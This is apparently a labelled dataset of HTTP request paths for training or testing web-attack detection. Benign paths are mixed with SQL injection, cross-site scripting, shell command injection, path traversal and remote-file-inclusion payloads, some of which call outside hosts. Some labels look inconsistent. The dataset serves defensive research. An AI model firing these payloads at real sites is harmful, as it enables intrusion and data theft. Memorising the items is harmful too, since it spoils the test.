request	label
/ string / strings / parameters = sabathiel 	0
/ newsid_1137000 / 	0
/ string / strings / parameters = arine 	0
/ javascript / legal . png 	0
/ h5sc3gxy . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 '  +  ( select hvsb where 3666 = 3666 ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 -- 	1
/ javascript / sec . aspx 	0
/ string / strings / parameters = &  & echo $ ifsqgzotf $  (  ( 32 + 38 )  )  $  ( echo $ ifsqgzotf ) qgzotf \  \ 	1
/ string / strings / parameters = < xonxxx = 1 	1
/ 060510-205107 / 	0
/ string / strings / parameters = '  |   [  1 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = 1 )  as attr where 8085 = 8085 and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
/ scripts / index . php ? id = urjhxcl19w ' 	1
/ 2157214300054188876aqxhyz_th / 	0
/ linux_review / 	0
"/ main . php ? stuff =  "" ping \ x0b-w \ x0b11000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ admin / doeditconfig . php ? thispath =  .  .  / includes & config [ path ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ? 	1
/ examples / jsp / checkbox / squirrelcart / cart_content . php ? cart_isp_root =  / etc / passwd \ x00 	1
/ adhocjobsearch / 	0
/ l752x1ry . php ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / mailer . sql 	0
"/ string / strings / parameters = &  & echo $ ifsaubgio $  (  ( 90 + 39 )  )  $  ( echo $ ifsaubgio ) aubgio "" "	1
/ 000026369 / 	0
/ eg2u8pbv . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  &  & echo $ ifsqnmpmk $  (  ( 16 + 94 )  )  $  ( echo $ ifsqnmpmk ) qnmpmk 	1
/ 1545639 / 	0
/ string / strings / parameters = & echo $ ifsjreiyl $  (  ( 10 + 95 )  )  $  ( echo $ ifsjreiyl ) jreiyl \ 	1
/ appalto_integrato / 	0
/ string / strings / parameters = berba . andreguy4 @ campanasextractoras . sh 	0
/ string / strings / parameters = 1 '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  ' njnr '  =  ' njnr 	1
/ phpreactor / inc / view . inc . php ? pathtohomedir = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	0
/ flashofdm / 	0
/ javascript / dock . jar 	0
/ string / modo = registro & logina = scandret61 & password = 36no5i3 & nombre = valquiria & apellidos = pelayo + petit & email = nabors . albalak @ videotubo . mc & dni = 18049190d & direccion = camino + minguets + 120 ,  + 2e & ciudad = valtajeros & cp = 37777 & provincia = guadalajara & ntc = 2528225363434285 & b1 = registrar 	1
/ gy23xnjq . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = azarosa 	0
/ 340808 / 	0
/ javascript / trailers . fcgi 	0
/ newscom / 	0
/ string / strings / parameters = es + teatita 	0
"/ r3le3om5 . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ espionage + freespeech / 	0
/ string / strings / parameters = echo $ ifsrngrkm $  (  ( 66 + 9 )  )  $  ( echo $ ifsrngrkm ) rngrkm /  / 	1
/ jnv890lt . php ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ ao22ww7y . pl ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ string / strings / parameters = echo gcitop $  (  ( 61 + 30 )  )  $  ( echo gcitop ) gcitop /  / 	1
/ string / strings / parameters = v9lenc8an3sm9 	0
/ itdownloads / 	0
/ fauci-50 / 	0
/ 9o6g5vkn . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  )   -- 	1
/ javascript / key . rss 	0
/ string / strings / parameters = tapies ximenis 	0
/ html_b / 	0
/ string / strings / parameters = 13258011y 	0
"/ u95h6ymu . asp ?  < script > document . cookie =  "" testkhwc = 4028 ;  ""  <  / script > "	1
"/ string / strings / parameters = -9265 ""  ""  )  or 7834 = 1685 "	1
/ javascript / on . csproj 	0
/ lastpostinthread22659 / 	0
/ multi-browser xp_information / 	0
/ nikond70_2006 / 	0
/ string / strings / parameters = @  ' 	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo yikkeu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ javascript / patch . cs 	0
/ string / modo = registro & login = jande & password = a06b6 & nombre = arvid & apellidos = coca + artero & email = harrold_elloy @ santacruzdelvoto . ci & dni = 12370442f & direccion = sierra + del + gudar + 98 ,  +  & ciudad = ortigosa + de + cameros & cp = 22470 & provincia = a + corua & ntc = 3245452183569196 & b1 = registrar 	0
"/ string / modo = entrar & login = nezm & pwd = 1eb5l0e & remember = off & b1 = entrar <  !  --  # exec + cmd =  "" ls +  /  ""  --  > "	1
/ string / strings / parameters = 1 %  '  )  ; select pg_sleep ( 5 )  and  (  '  %  '  =  ' 	1
/ devil kings_information / 	0
/ string / modo = registro & login = varia & password = alm . ora & nombre = alejandro & apellidos = maestre + camprubi & email = backer @ showcars . com . co & dni = 20098056n & direccion = c /  + la + marina + 187 + 13 ? a & ciudad = bellcaire + d ' empord & cp = 39719 & provincia = huelva & ntc = 3234011820759237 & b1 = registrar 	0
/ javascript / orders . exe 	1
/ string / strings / parameters = 1 '  )  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  (  (  ' pemj '  =  ' pemj 	1
/ 039960 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hsrgrg )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / strings / parameters = 1 )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  ( 9069 = 9069 	1
/ string / strings / parameters = 1 '  )  ; select  ( case when  ( 4719 = 8852 )  then 1 else 4719 *  ( select 4719 from master .  . sysdatabases )  end )  -- 	1
"/ string / strings / parameters = -3790 ""  ""  )  as ojgb where 5925 = 5925 union all select 5925 , 5925 # "	1
/ nes roms / 	0
/ conmebol / 	0
/ iissamples / sdk / asp / docs / winmsdp . exe 	1
/ string / strings / parameters = |  | echo jclzpj $  (  ( 70 + 40 )  )  $  ( echo jclzpj ) jclzpj \  \ 	1
/ lib / action / rss . php ? lib = xxpathxx ? 	1
/ string / strings / parameters = \ nid | 	1
"/ string / strings / parameters = -4589 ""  ""  )  union all select 1441 , 1441 , 1441 , 1441 , 1441 , 1441 , 1441 , 1441 , 1441 , 1441 -- "	1
/ another_misstep / 	0
/ examples / jsp / jsp2 / el / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 ' 	1
/ string / strings / parameters = 1 and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  #  dyed 	1
/ softwareinfo / 	0
/ string / strings / parameters = 1 '  )  )  as mxxd where 7255 = 7255 or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
"/ help . php ? q =  "" rm q77224434 & rem "	1
/ string / strings / parameters = 1 where 7224 = 7224 and sleep ( 5 )  # 	1
/ jsoft2 / 	0
/ wimax-wimaxcomblog / 	0
/ ceasefires_gifts / 	0
/ home entertainment / 	0
/ javascript / ini . meta 	0
/ 133937 / 	0
/ string / strings / parameters = 5036778650405780 	0
/ siamese-twins / 	0
/ string / strings / parameters = claudine 	0
"/ 5qnlm5z2 . do ?  < script > document . cookie =  "" testsixi = 8451 ;  ""  <  / script > "	1
/ string / strings / parameters = regis @ magritte . us 	0
/ string / modo =   & login = cash3 & password = urpila & nombre = jeanne & apellidos = sandrini + rotllant & email = olmer @ matchball . com . im & dni = 52809393j & direccion = plaa + de + can + galta + cremat ,  + 111 +  & ciudad = navia & cp = 37447 & provincia = cdiz & ntc = 1124103686450000 & b1 = registrar 	1
/ 120024 / 	0
/ string / modo = registro & login = ivanyi0 & password =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & nombre = crescencio & apellidos = echevarra + borras & email = tadio . bixby @ espaciopintor . eh & dni = 98763423c & direccion = torrent + de + can + quintana ,  + 179 ,  +  & ciudad = llocnou + de + la + corona & cp = 49430 & provincia = lleida & ntc = 8110791105529474 & b1 = registrar 	1
/ paint shop photo album 4 / 	0
/ string / strings / parameters = ortigas huerta 	0
/ javascript / inc . trace 	0
/ string / strings / parameters = -9541 )  as bnky where 3934 = 3934 union all select 3934 , 3934 , 3934 # 	1
/ all civil war comics to date 12 / 	0
/ string / strings / parameters = -7720 )  )  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ( 8254 = 8254 	1
/ clk ; 63222941 ; 7163019 ; d / 	1
/ string / strings / parameters = < math >  < brute xlink : href = javascript : alert ( 1 )  > click 	1
/ string / modo = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & precio = 7285 & b1 = confirmar 	1
/ javascript / hide . meta 	0
/ headshot100 / 	0
/ string / strings / parameters = -1807 '  )  )  union all select 9853 , 9853 , 9853 , 9853 , 9853 , 9853 # 	1
/ city_namibia / 	0
/ 042099 / 	0
/ autopsy_gifts / 	0
/ 149834 / 	0
/ examples / jsp / checkbox / index . php ? user_langue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ mzfriends / 	0
/ news-content / 	0
"/  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
/ string / strings / parameters = 1 )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) 	1
/ string / modo = entrar & login = clarette & pwd = 78102d84 ! am1nte & remember = off & b1 = entrar 	0
/ javascript / nc . zip 	0
/ pizdoblyad / 	0
/ string / strings / parameters = 04740 	0
/ serial-crack / 	0
/ inc / libs / core / core . display_debug_console . php ? plugin_file = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	0
/ string / strings / parameters = 10650 	0
/ javascript / restricted . tpl 	0
/ 000094420 / 	0
/ string / modo = registro & login = siefert & password = almirante & nombre = dido & apellidos = albornoz + quiva & email = tekurarere @ velaconsultores . no & dni = 74469828z & direccion = calle + andavias + s / n ,  +  & ciudad = calabazas + de + fuentiduea & cp = 16370 & provincia = barcelona & ntc = 2457460821746033 & b1 = registrar 	0
"/ 0u75ldxq . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo parklw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ examples / jsp / jsp2 / el / index . php ? include_files [  ]  =  & include_files [ query_string ]  =  / etc / passwd 	1
/ javascript / input . htm 	0
"/ string / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ newpaperbacks / 	0
/ maincounter11 / 	0
/ string / modo = registro & login = lonald8 & password = 5h5c8 & nombre = ivonne & apellidos = abarrategui + allende & email = pap @ evelin . com . ly & dni = 94629114f & direccion = haiti + 27 + 1 ? g & ciudad = hortigela & cp = 47319 & provincia = sevilla & ntc = 3123820484071721 & b1 = registrar 	0
/ defendyourcomputer_feat / 	0
/ promodetails / 	0
/ string / strings / parameters = -5420 '  )  union all select 2508 , 2508 , 2508 , 2508 , 2508 , 2508 , 2508 # 	1
"/ top . php ? stuff =  "" ping , -w , 11000 , -n , 1 , 4 . 3 . 2 . 1 | rem , "	1
/ string / modo = insertar & precio = 9567 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = confirmar 	1
"/ lmw4r201 . nsf ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
"/ string / strings / parameters = ""  |   [  5 -ne  $  ( echo tiqlnl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' "	1
/ wedding_hair / 	0
"/ string / strings / parameters = -4528 ""  ""  )  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  ""  "" fxmt ""  ""  like  ""  "" fxmt "	1
/ ozarks / 	0
/ examples / jsp / checkbox / index . php ? module =  < script > foo <  / script > 	1
/ modules / syslog / index . php ? full_path = xxpathxx 	1
/ 000066345 / 	0
/ devryfacrecad / 	0
/ javascript / logger . key 	0
/ string / strings / parameters = '   str =  $  ( echo gzkcja )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ cwhp / auditlog . do ? file =  .  .  .  .  .  .  .  .  .  .  .  .  .  .  \ x08oot . ini 	1
"/ help . php ? q =  "" del \ x09q12928131 \ x09 # "	1
/ string / strings / parameters = 69 	0
/ string / strings / parameters = 4518 	0
/ tomclancysrainbowsixvegas / 	0
/ string / modo = insertar & precio = 6766 & b1 = pasar + por + caja 	0
"/ manager / workarea / contentdesigner / ekformsiframe . aspx ? id =  ""  >  < script > alert (  ' nessus '  )  <  / script > "	1
/ string / strings / parameters = 41953346n 	0
/ procurea / 	0
/ javascript / format . exe 	1
/ en-us / esmozg5d . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = reiko 	0
/ top . php ? stuff =  '  | sleep 8  # 	1
/ string / strings / parameters = elefa_n7ina 	0
/ vbcodelibrary_4 / 	0
/ commitee / 	0
/ javascript / courses . key 	0
/ 8051iconheadervers1 / 	0
/ string / strings / parameters = ; echo fotfwd $  (  ( 3 + 5 )  )  $  ( echo fotfwd ) fotfwd /  / 	1
/ hosts2 / 	0
/ examples / jsp / colors / data / fetch . php ? page =  ' 	1
/ javascript . php ? abs_path =  / etc / passwd \ x00 	1
"/ qczkquis . do ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
/ string / strings / parameters = 25723 	0
/ msg27525293 / 	0
/ string / strings / parameters = bermdez delvalle 	0
/ nav_giftguide5 / 	0
/ 201265677_a9efbdd6c3 / 	0
/  .  .  .  .  { file } 	1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00 	1
/ string / strings / parameters = 8320964749931174 	0
/ javascript / texts . asp 	0
/ string / strings / parameters = kirbie 	0
/ string / strings / parameters = boa4 @ sitienesunawebtienesunnegocio . es 	0
/ string / strings / parameters = -1985 %  '  )  )  )  union all select 3051 , 3051 , 3051 -- 	1
/ sunwukong / 	0
/ string / modo = registro & login = angeline0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & password = tasajo & nombre = anataln & apellidos = gironell + nurnberg & email = alari-clayton @ blueeyes . mm & dni = 02864580e & direccion = c /  + pescadores + de + terranova ,  + 108 ,  + 9-e & ciudad = gironella & cp = 34309 & provincia = lleida & ntc = 1940469779787284 & b1 = registrar 	1
"/ string / strings / parameters = ""  )  ;  } print (  ` echo mditeg ; echo  $  (  ( 51 + 68 )  )  ; echo mditeg ; echo mditeg `  )  ;  .  ' mditeg "	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  rlike sleep ( 5 )  # "	1
/ javascript / cocoon . xls 	0
"/ d765w06j . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 5854 	0
/ 191162_2 / 	0
/ 040660 / 	0
/ examples / jsp / jsp2 / el / sgdynamo . exe ? htname = sgdynamo . exe 	1
/ gebruikersinformatie / 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo nahljw )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / modo = entrar & login = ness & pwd = juma & remember = on /  & b1 = entrar 	1
/ src / scripture . php ? pageheaderfile = xxpathxx ? 	1
/ religija / 	0
/ string / strings / parameters = capmany ,  94 4 ? e 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 85 & cantidad = 64 & b1 = aadir + al + carrito 	0
/ 107762 / 	0
/ mpcgi / view_item ? html_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = >  ""  ""  < iframe src = http :  /  / vulnerability-lab . com >  <  / iframe > "	1
/ javascript / fuckoff . php3 	0
/ string / strings / parameters = ladn 	0
/ webyep-system / programm / webyep . php ? webyep_sincludepath = xxpathxx ? 	1
/ examples / servlets / servlet / k / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor 	1
/ javascript / serv . exe 	1
/ javascript / s . exe 	1
/ elmomento / 	0
/ 155136 / 	0
/ mybanners / 	0
/ fcgi-bin / cgi-test . exe 	1
/ javascript / fuckyou . tar 	0
/ film-scanners / 	0
/ maze-builder / 	0
/ 4423456 / 	0
/ string / strings / parameters = gomarov @ manuelpaloma . fr 	0
/ string / modo = insertar & precio = 3916 & b1 = confirmar 	0
/ string / strings / parameters = grevelin 	0
"/ string / strings / parameters = ""  /  >  < a href = javascript & colon ; confirm & lpar ; document & period ; cookie & rpar ;  > click here <  / a > "	1
/ avenger -bloodsports / 	0
/ string / strings / parameters = 1 '  +  ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555 , 9555 )  )  +  ' 	1
/ javascript / web-console . exe 	1
/ string / strings / parameters = &  & echo $ ifszmbrno $  (  ( 77 + 76 )  )  $  ( echo $ ifszmbrno ) zmbrno 	1
/ 140crt428 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo nsanup )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 16 & b1 = aadir + al + carrito 	0
/ 0706062rush1 / 	0
/ peelers / 	0
"/ help . php ? q =  ""  \ x0drm q43695626  # "	1
/ movie33 / 	0
/ rs-422 / 	0
"/ demo / ms-pe02 / catalog . php ? cid = 0 & sid =  '  ""  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / cirt . net / rfiinc . txt ?  & "	1
/ versandcenter / 	0
/ examples / jsp / error / pals-cgi ? palsaction = restart & documentname =  / etc / passwd 	1
/ string / strings / parameters = echo gqtwxi $  (  ( 72 + 93 )  )  $  ( echo gqtwxi ) gqtwxi \ 	1
/ examples / jsp / jsp2 / jspx / shopexd . asp ? catalogid =  ' 42 	1
/ egaet53a . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ acf3e4c / 	0
/ string / strings / parameters = amelita 	0
/ supportwarehouse / 	0
/ string / strings / parameters = ghossein 	0
"/ help . php ? q =  ""  & del ; q51857139 & rem ; "	1
/ hsi_ec39 / 	0
/ sexystripedpants / 	0
/ mailboxfiletobemail / 	0
/ javascript / sink . o 	0
"/ string / strings / parameters = ""  ,  ( select if ( count (  *  )  !  = -1 , benchmark ( 3000000 , md5 ( 1 )  )  , benchmark ( 3000000 , md5 ( 1 )  )  )  )  # "	1
/ string / strings / parameters = exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 1049 = 1049 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  ) 	1
/ string / modo = registro & login = messier & password = c7b183o & nombrea = nicodemo & apellidos = triola + villuend & email = galloway @ rtce . gu & dni = 35507822p & direccion = numero + 15 ,  + 151 ,  +  & ciudad = castrillo + de + la + guarea & cp = 23657 & provincia = toledo & ntc = 1278501676319264 & b1 = registrar 	1
/ 0x2e0x2ex2e0x2ex2e0x2ex2e0x2e { file } 	1
/ javascript / rakefile . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  -- "	1
/ for_sealholders / 	0
/ string / modo = entrar & login = win-chyi & pwd = a1e143 , 3se & remember = off & b1 = entrar 	1
"/ top . php ? stuff =  "" del \ x0bq24192811 & rem \ x0b "	1
/ 00603sport / 	0
"/ string / strings / parameters = -7579 %  ""  ""  or 6570 = 1764 "	1
/ string / modo = insertar & precio = 6875 & b1 = confirmar / 	1
/ 156804 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ccuvua )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ string / strings / parameters = 1 '  where 8770 = 8770 union all select null -- 	1
/ string / modo = registro & login = hew +  / s & password = z51er94 & nombre = aliana & apellidos = pedraza + almendro & email = barkley @ tecnoindomo . sj & dni = 36793762h & direccion = c /  + asensio + y + toledo + 50 ,  + 13 ? g & ciudad = rillo & cp = 02131 & provincia = soria & ntc = 2979562523275482 & b1 = registrar 	1
/ help . php ? q = uname \ x09 > q63592644 \ x09 # 	1
"/ gy23xnjq . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = filen ? a 	0
/ string / strings / parameters = mori @ itrends . do 	0
/ string / strings / parameters = 1 '  and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  ' foju '  =  ' foju 	1
/ string / modo = entrar & login = aluino & pwd = l0s4njear & remember = on & b1 = entrar 	0
"/ string / strings / parameters = -4291 ""  ""  )  )  or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  ""  "" xyhi ""  ""  =  ""  "" xyhi "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' lstx '  from dual where 2972 = 2972 or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  )  |  |  ' 	1
/ functions-comparisons / 	0
/ javascript / cgiwrap . swf 	0
/ string / strings / parameters = 2187426645944865 	0
/ 000126726 / 	0
/ webfirst / 	0
"/ pxagj7n7 . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ hipkz026 . html ?  < script > document . cookie =  "" testyrbs = 2855 ;  ""  <  / script > "	1
/ asb00-30 / 	0
/ trojqqpassi / 	0
/ msg27525026 / 	0
"/ string / strings / parameters = '  & echo $ ifshkzbyj $  (  ( 43 + 76 )  )  $  ( echo $ ifshkzbyj ) hkzbyj "" "	1
"/ h5i6crm3 . pl ?  < script > document . cookie =  "" testlihk = 7070 ;  ""  <  / script > "	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo eedngd )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / modo = insertar & precio = 9111 & b1 = confirmar / 	1
/ string / modo = registro & login = damien & password = cerc4 & nombre = nicodemo & apellidos = chiri & email = borg @ conoceagelespaa . py & dni = 96284579r & direcciona = calle + isaac + albeniz ,  + 23 +  & ciudad = arenal ,  + el & cp = 42132 & provincia = alicante & ntc = 8673222014088073 & b1 = registrar 	1
/ include / define . php ? inc_dir = xxpathxx ? 	1
/ 000108271 / 	0
/ 462245643xpbwxi_th / 	0
/ fgcucares / 	0
/ string / strings / parameters = -5356 '  )  or 9323 = 9323 # 	1
/ string / strings / parameters = gargajienta 	0
/ string / strings / parameters = c4e32788ia 	0
/ horny daddy fucks his horny daugther / 	0
/ rws5734 / 	0
/ string / strings / parameters = 5exas9labo 	0
/ string / strings / parameters = lorenson-tordi @ youtubeanunciox . fk 	0
/ cgi-bin / neomail-prefs . pl ? sessionid = nessus-session-0 . neomail_sessionid_validation . nasl & action = addfolder & foldername = d9nvh_jfwsxft1eks 	0
/ indextop2 / 	0
/ psynch / nph-psa . exe ? css = xxpathxx 	1
/ top . php ? stuff =  & ver ,  > q25697841 & rem , 	1
/ en-us / account / index . php ? op = default & date = 200607 '  union select 1 , 1782293471 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ qaf - 512 / 	0
/ string / strings / parameters = 1122690078978672 	0
/ string / strings / parameters = thies 	0
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo jtxvkl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ string / strings / parameters = 1 '  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  ' gkku '  like  ' gkku 	1
/ 9gnok8vo . asmx 	0
/ string / strings / parameters = ;  str =  $  ( echo oqsiql )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ examples / jsp / num / login . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . txt 	1
/ javascript / hop . exe 	1
/ string / strings / parameters = urea bernat 	0
"/ string / strings / parameters = geturl (  "" javascript : alert (  ' xss '  )  ""  ) "	1
/ javascript / cgi-bin . xslt 	0
/ string / strings / parameters = juan antonio simon 19 	0
/ ata_middleware / 	0
"/ string / modo = registro & login = pepple & password = endelgadecer & nombre = nolsaco & apellidos = antolnez + tamallangos & email = hassall @ 007tv . nf & dni = 80856285s & direccion = c /  + capitanes + ripoll ,  + 68 ,  + 9-g & ciudad = pajaroncillo & cp = 01120 & provincia = madrid & ntc = 3246974816793870 & b1 = registrarparos ""  style =  "" background : url ( javascript : alert (  ' paros '  )  ) "	1
/ javascript / squirrelmail . exe 	1
/ tn_229 / 	0
/ string / strings / parameters = dellinge 	0
/ string / strings / parameters = 7328487028477880 	0
